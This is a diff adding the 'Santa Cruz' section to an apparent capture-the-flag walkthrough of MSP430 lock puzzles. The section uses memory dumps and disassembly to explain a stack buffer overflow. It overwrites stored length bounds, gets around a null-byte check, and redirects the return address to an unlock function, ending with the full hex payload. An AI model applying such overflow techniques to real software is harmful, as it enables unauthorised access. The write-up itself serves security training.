@@ -389,7 +389,87 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa32453c447f00
 
 ## 8.  Santa Cruz
 
+This is an odd one.  It requires a username and password, both between 8 and 16 bytes.
 
+The method of enforcing this is the following:
+
+After the username and password have been entered, the stack (with
+sp=0x43a0) looks like:
+
+```
+43a0:   0000 4142 4344 4546 4748 494a 0000 0000   ..ABCDEFGHIJ....
+43b0:   0000 0008 1061 6263 6465 6667 6869 6a6b   .....abcdefghijk
+43c0:   6c6d 0000 0000 0000 0000 0000 4044 0000   lm..........@D..
+```
+
+Notice the 08 and 10 at 43b3.  We note that these are the stated upper
+and lower bounds for the lengths of the username and password, and
+indeed, if we watch the execution, we see that these are indeed used
+for checking lengths.
+
+Since the code that actually reads the username is:
+
+```
+4582:  3e40 6300      mov	#0x63, r14
+4586:  3f40 0424      mov	#0x2404, r15
+458a:  b012 1847      call	#0x4718 <getsn>
+```
+
+We actually get 0x63 bytes of username, with which we can clearly
+overwrite these values.  Of course, strcpy means we cannot have any
+null bytes.  But we can use the username to overwrite these values
+with the bytes 01 and 7f--the minimum and maximum positive integers
+expressed by a signed byte.
+
+Thus our username will be (in hex):
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017f
+
+However, the password must also end in a null byte.  The following
+snippet appears at the end of the `login` function:
+
+```
+4644:  3f40 3145      mov	#0x4531 "That password is not correct.", r15
+4648:  b012 2847      call	#0x4728 <puts>
+464c:  c493 faff      tst.b	-0x6(r4)
+4650:  0624           jz	#0x465e <login+0x10e>
+4652:  1f42 0024      mov	&0x2400, r15
+4656:  b012 2847      call	#0x4728 <puts>
+465a:  3040 4044      br	#0x4440 <__stop_progExec__>
+465e:  3150 2800      add	#0x28, sp
+4662:  3441           pop	r4
+4664:  3b41           pop	r11
+4666:  3041           ret
+```
+
+In particular, the instruction at 464c will test for a null byte 18
+bytes after the start of the password.  So if we make the password
+super long and overflow the return address (which, breaking at the
+`ret` instruction, we can discover is at 43cc), this test will
+fail and we will exit without returning (on address 465a).
+
+Thus we can do the following trick: We can make the username long
+enough to overflow the stack pointer, and we can make the password
+exactly 17 bytes, so that a null byte will be written to the 18th byte
+after the start of the password.  Of course, we still need byte
+offsets 17 and 18 of the username to be 01 and 7f respectively to get
+away with this excessive length.
+
+So we try: 
+
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017fa0a1a2a3a4a5a6a7a8a9a0aaabacadaeafb0b1b2b3b4b5b6b7b8b9b0babbbcbdbebf
+cccccccccccccccccccccccccccccccccc
+```
+
+And we observe that this reaches the return instruction and b7b6 is
+placed into pc.  Therefore we replace this with the address of the
+`unlock_door` function: 444a for a final answer of:
+
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017fa0a1a2a3a4a5a6a7a8a9a0aaabacadaeafb0b1b2b3b4b54a44
+cccccccccccccccccccccccccccccccccc
+```
 
 ## 9.  Addis Ababa
 
